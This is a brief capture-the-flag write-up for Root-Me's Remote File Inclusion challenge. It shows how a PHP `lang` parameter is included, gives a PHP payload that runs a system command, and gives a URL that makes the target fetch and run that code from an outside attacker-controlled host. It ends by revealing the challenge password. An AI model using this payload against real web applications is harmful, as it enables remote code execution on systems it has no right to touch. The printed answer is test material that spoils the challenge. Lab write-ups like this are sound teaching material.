# [Remote File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)

Much like the local file inclusion challenges, we have PHP that is dynamically including 
files in the code. In this case, the url parameter `lang` is being prepended to `_lang.php`

We know this because we can submit `?lang=a` and we get an error saying that they cannot find 
the file `a_lang.php`.

Being that this is a remote file inclusion bug, what if we set up our own PHP script on our 
own website called `evil_lang.php`. It's contents looking like this:

`<?php echo system('cat index.php'); ?>`

Then include that page in the url:

`?lang=http://zumo22.000webhostapp.com/evil`

NOTE: Turn off PHP execution in your `.htaccess` file so that the PHP gets executed on the 
challenge site and not your server.

View the source of the page and we see raw PHP code!

Password is: **R3m0t3_iS_r3aL1y_3v1l**
